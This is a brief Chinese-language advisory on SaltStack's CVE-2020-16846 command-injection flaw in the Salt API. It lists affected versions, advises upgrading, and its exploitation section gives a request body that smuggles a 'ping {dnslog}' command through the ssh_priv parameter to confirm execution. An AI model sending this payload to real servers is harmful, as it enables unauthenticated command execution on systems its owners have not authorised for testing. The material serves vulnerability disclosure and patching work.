### 一 漏洞描述
SaltStack是一个分布式的运维系统，在互联网场景中被广泛应用，有以下两个主要功能:
1.配置管理系统，能够将远程节点维护在一个预定义的状态(例如：确保安装特定的软件包并运行特定的服务)
2.分布式远程执行系统，用于在远程节点上单独或者通过任意选择标准来执行命令和查询数据。

CVE-2020-16846:命令注入漏洞 未经过身份验证的攻击者通过发送特质的请求包，可以通过Salt API注入ssh连接命令导致命令执行。

影响: SaltStack 2015/2016/2017/2018/2019/3000/3001/3002

### 二 漏洞利用
```
command = "token=12312&client=ssh&tgt=*&fun=a&roster=whip1ash&ssh_priv=aaa|ping%20{dnslog}%3b"
headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:78.0) Gecko/20100101 Firefox/78.0', 'Content-Type': 'application/x-www-form-urlencoded'}
```

### 三 漏洞修复
升级

> 参考链接  
> https://cloud.tencent.com/developer/article/1969622
